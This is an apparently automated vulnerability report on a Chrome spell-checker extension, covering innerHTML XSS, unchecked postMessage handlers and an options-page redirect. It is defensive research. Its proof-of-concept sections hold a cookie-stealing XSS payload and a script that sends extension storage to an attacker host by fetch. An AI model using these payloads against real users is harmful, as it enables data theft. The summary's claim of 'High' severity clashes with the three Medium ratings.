# Vulnerability Report: Spell Checker for Chrome (jfpdnkkdgghlpdgldicfgnnnkhdfhocg)

**Extension Version:** 0.9.4.9
**Manifest Version:** 3
**Date:** 2026-02-06
**Analyst:** Security Research (Automated Deep Dive)

---

## Executive Summary

Analysis of "Spell Checker for Chrome" identified **3 verified vulnerabilities** ranging from Medium to High severity. The extension's content scripts run only on `iblogbox.com` pages (the developer's own domain), which limits the attack surface significantly -- exploitation requires either compromise of the iblogbox.com server or a man-in-the-middle position to inject content into those pages. However, the extension also makes unauthenticated requests to third-party spell-check APIs whose responses are rendered unsafely, and uses `postMessage` with insufficient origin validation to bridge between page scripts and extension content scripts. A compromised or malicious spell-check API server could achieve JavaScript execution in the extension's content script context.

---

## Vulnerability 1: Stored XSS via Unencoded Spell-Check API Response in innerHTML

**CVSS 3.1:** 6.1 (Medium) — `AV:N/AC:H/PR:N/UI:R/S:C/C:L/I:L/A:N`

**Files / Lines:**
- `js/spellcheck.js:1225` — `proc_change_ok()`: `obj2.innerHTML='<font color="'+g_config.color_changed+'">'+obj.value+'</font>';`
- `js/spellcheck.js:1407` — `proc_change_all()`: `obj.innerHTML='<font color="'+g_config.color_changed+'">'+target2+'</font>';` (when called with `encodeoff=true` from line 1217)
- `js/spellcheck.js:1083` — `proc_edit_fill()`: `obj.innerHTML=b.desc;` (Korean speller path)

**Description:**

The `proc_change_ok()` function reads the selected value from the `sel_change` dropdown (`obj.value`) and writes it directly into the DOM via `innerHTML` at line 1225 without HTML-entity encoding. The dropdown options are populated from spell-check API responses:

1. **English path** (`proc_spell_en` via `newappzone.com/spellcheck/`): The response JSON array contains `l.value[]` items that are pushed into `m.correct[]` at line 1815 without encoding. The dropdown options are encoded via `html_entity_encode()` at line 1064, but when the user selects a value and clicks "change", `obj.value` returns the **decoded** DOM value. This decoded value is then inserted via innerHTML at line 1225 without re-encoding.

2. **Korean path** (`proc_spell_ko` via `nara-speller.co.kr`): The `d.help` field from the JSON response is assigned directly to `a.desc` at line 1796 without any encoding. This `desc` is then rendered via `obj.innerHTML=b.desc` at line 1083.

3. **LanguageTool path** (`proc_spell_en2` via `languagetool.org`): The `a.message` field is HTML-entity-encoded when building `c.desc` at line 1807-1808. This path is properly sanitized.

Additionally, `proc_change_all()` is called from `proc_change_ok()` at line 1217 with `encodeoff=true`, meaning the raw `obj.value` is inserted without encoding into all matching spell labels at line 1407.

**PoC Exploit Scenario:**

1. An attacker compromises or performs a MITM attack on `newappzone.com` (HTTP endpoint proxied through the extension's background page fetch).
2. The malicious server returns a spell-check response containing a suggestion value like: `<img src=x onerror="alert(document.cookie)">`
3. The user opens Spell Checker, types text, and runs spell check.
4. The malicious suggestion appears in the dropdown (HTML-encoded in the option display).
5. When the user selects the suggestion and clicks "Change", `obj.value` decodes back to the raw HTML, which is written to `innerHTML` at line 1225.
6. The injected `<img>` tag executes arbitrary JavaScript in the iblogbox.com content script context, with access to `chrome.runtime.sendMessage` to communicate with the background page.

**Impact:**

An attacker who controls a spell-check API response can execute arbitrary JavaScript in the content script context when the user applies a spelling suggestion. This grants access to:
- Reading/writing extension storage via the background message API (`type:'set'`, `type:'get'`)
- Opening arbitrary URLs via `type:'open_tab'`
- Making arbitrary fetch requests via `type:'get_url'` (using the extension's `host_permissions` to bypass CORS to `googleapis.com`, `languagetool.org`, `nara-speller.co.kr`)

---

## Vulnerability 2: postMessage Handler Allows Cross-Origin Storage Manipulation

**CVSS 3.1:** 5.0 (Medium) — `AV:N/AC:H/PR:N/UI:R/S:C/C:N/I:L/A:L`

**Files / Lines:**
- `js/option.js:363-377` — `window.addEventListener("message", ...)` with `event.source != window` check only
- `js/option.js:152` — `window.postMessage({type: "btn_beforesave"}, "*")`
- `js/option.js:370` — `window.postMessage({type: "re_btn_get", response:response, issort:a.issort}, "*")`
- `js/option.js:401` — `window.postMessage({type: "btn_afterinit"}, "*")`

**Description:**

The `option.js` content script (injected on `iblogbox.com/chrome/spellcheck/option/*`) listens for `window.postMessage` events. The only validation is `event.source != window` at line 364, which filters out messages from the content script itself. However, this check **does not validate `event.origin`**.

The content script runs on the iblogbox.com options page. The iblogbox.com page itself (or any iframe embedded in it, or any script injected into the page) can send postMessages that pass the `event.source == window` check because page-level scripts and content scripts share the same `window` object for postMessage purposes.

The handler accepts three message types:
- `btn_get` (line 368): Reads any key from extension storage and broadcasts the response back via `postMessage("*")` (line 370), leaking storage values to ANY window listener.
- `btn_set` (line 372): Writes any arbitrary key-value pair to extension storage.
- `btn_notsaved` (line 374): UI state manipulation.

The `postMessage("*")` at line 370 broadcasts storage values without targeting a specific origin, meaning any page (including iframes from other origins) could listen for and capture these values.

**PoC Exploit Scenario:**

1. The user navigates to the extension's options page (hosted on iblogbox.com).
2. If iblogbox.com is compromised or serves third-party ads/scripts, a malicious script on the page can:
   ```javascript
   // Read sensitive extension config
   window.addEventListener("message", function(e) {
     if (e.data.type === "re_btn_get") {
       // Exfiltrate e.data.response (user dictionary, config, etc.)
       fetch("https://attacker.com/steal?data=" + encodeURIComponent(JSON.stringify(e.data)));
     }
   });
   window.postMessage({type: "btn_get", name: "user_dic_data"}, "*");

   // Overwrite extension settings
   window.postMessage({type: "btn_set", name: "other_ko_spellopentype", value: "1"}, "*");
   ```

**Impact:**

- Read any extension storage key (user dictionary, hotkey config, saved data)
- Write any extension storage key (modify behavior, overwrite user dictionary)
- The wildcard `"*"` targetOrigin in `postMessage` responses means storage data is broadcast to all listeners, including cross-origin iframes

---

## Vulnerability 3: Unvalidated Redirect in Options Page via Background Storage

**CVSS 3.1:** 4.7 (Medium) — `AV:N/AC:H/PR:N/UI:R/S:C/C:N/I:L/A:N`

**Files / Lines:**
- `js/ui/options.js:61-65` — `location.href=r.g_optionsurl;`
- `js/bg.js:114` — `g_optionsurl='https://iblogbox.com/chrome/spellcheck/option/v0.9.3.2.php?g_extensionid='+g_extensionid;`
- `js/bg.js:624` — Background `get_bgstorage` handler returns `g_optionsurl` directly

**Description:**

When the user opens the extension's options page (`options.html`), the `js/ui/options.js` script requests `get_bgstorage` from the background page and then performs `location.href = r.g_optionsurl` at line 63. The `g_optionsurl` value is hardcoded in `bg.js` line 114 to an iblogbox.com URL.

While `g_optionsurl` itself is not directly user-controllable, this is an open redirect pattern. If Vulnerability 2 is chained (using `btn_set` to overwrite storage keys that influence `g_optionsurl`), or if the iblogbox.com server returns a redirect, the user is silently redirected away from the extension context to an external web page.

However, examining the code more carefully, `g_optionsurl` is a JavaScript variable in the background page, not a storage key. It is set at initialization time and returned directly in the `get_bgstorage` response. The `btn_set` postMessage handler writes to `localStorage` (the emulated storage), not to JavaScript variables. Therefore, this is **not directly chainable** with Vulnerability 2.

The real risk is that the options page loads in an extension context (`chrome-extension://...`) but immediately navigates to `https://iblogbox.com/...`. If iblogbox.com is compromised, the user's options page becomes an attacker-controlled page. Combined with the content script that runs on that domain (with `all_frames: true`), this creates a trust boundary violation.

**PoC Exploit Scenario:**

1. User clicks the extension options page.
2. `options.html` loads from `chrome-extension://` context.
3. `js/ui/options.js` immediately redirects to `https://iblogbox.com/chrome/spellcheck/option/...`.
4. If iblogbox.com is compromised, the attacker controls the options page entirely.
5. The `option.js` content script then runs on this page, and the attacker-controlled page can use postMessage (Vulnerability 2) to read/write extension storage.

**Impact:**

- Silent redirect from extension options to an external web page
- If the external domain is compromised, full control over extension configuration via the content script bridge
- User trusts the options page because they opened it from Chrome's extension settings

---

## Non-Vulnerabilities (Triaged as False Positives)

### innerHTML with i18n messages
Multiple lines (e.g., `spellcheck.js:429,441,453-479`, `option.js:309,339,348`) use innerHTML to render `chrome.i18n.getMessage()` outputs. These values come from the extension's own `_locales/` message files bundled in the CRX and are not attacker-controllable. **Not a vulnerability.**

### innerHTML with html_entity_encode'd content
Lines like `spellcheck.js:1038,1042,1249,1276` properly encode values through `html_entity_encode()` before insertion into innerHTML. **Not a vulnerability.**

### show_message innerHTML
`show_message()` in `common.js:450`, `spellcheck.js:243`, and `option.js:91` writes `s` directly to innerHTML, but all callers pass hardcoded HTML strings with pre-encoded or static content. **Not a vulnerability** (all callers verified to use safe inputs).

### postMessage source check in spellcheck.js
`spellcheck.js:413-424` checks `event.source != window`, which is appropriate for its use case (same-window communication between page script and content script). The handler only processes `bg_proc_change` (calls `proc_change2` with a DOM element ID) and `bg_proc_change_ok` (calls `proc_change_ok`). While `a.id` at line 419 is used in `getElementById`, it cannot cause injection because `getElementById` is a safe lookup operation. The only concern is that a page script could trigger spell-change operations, but this is a functionality abuse rather than a security vulnerability in isolation.

### dynamic_tab_url / dynamic_window_open flags
`bg.js` opens tabs/windows using `g_spellcheckurl` (hardcoded to iblogbox.com) and `g_optionsurl` (also iblogbox.com). The `open_tab` message handler at `bg.js:604-609` opens `request.surl`, but this is only callable from content scripts (via `chrome.runtime.sendMessage`), not from arbitrary web pages. Content scripts only run on iblogbox.com. **Low concern** -- requires iblogbox.com compromise as a prerequisite, same as Vulnerability 3.

---

## Risk Summary

| # | Vulnerability | CVSS | Severity | File |
|---|--------------|------|----------|------|
| 1 | XSS via unencoded spell-check API response in innerHTML | 6.1 | Medium | js/spellcheck.js:1225, 1407, 1083 |
| 2 | postMessage handler leaks storage and allows writes without origin validation | 5.0 | Medium | js/option.js:363-377 |
| 3 | Options page open redirect to external domain | 4.7 | Medium | js/ui/options.js:63 |

**Overall Assessment:** The extension's attack surface is constrained by its content script scope (only iblogbox.com). The most impactful vulnerability is #1 (XSS via malicious spell-check API response), which requires compromise of `newappzone.com` or `nara-speller.co.kr`, but could result in arbitrary code execution in the content script context with access to the extension's message-passing API. The combination of Vulnerabilities 2 and 3 creates a chain where compromise of iblogbox.com grants full control over extension storage.

**No malicious intent was detected.** These are coding quality issues typical of a long-lived extension (copyright 2011) that has been incrementally updated without modern security practices.
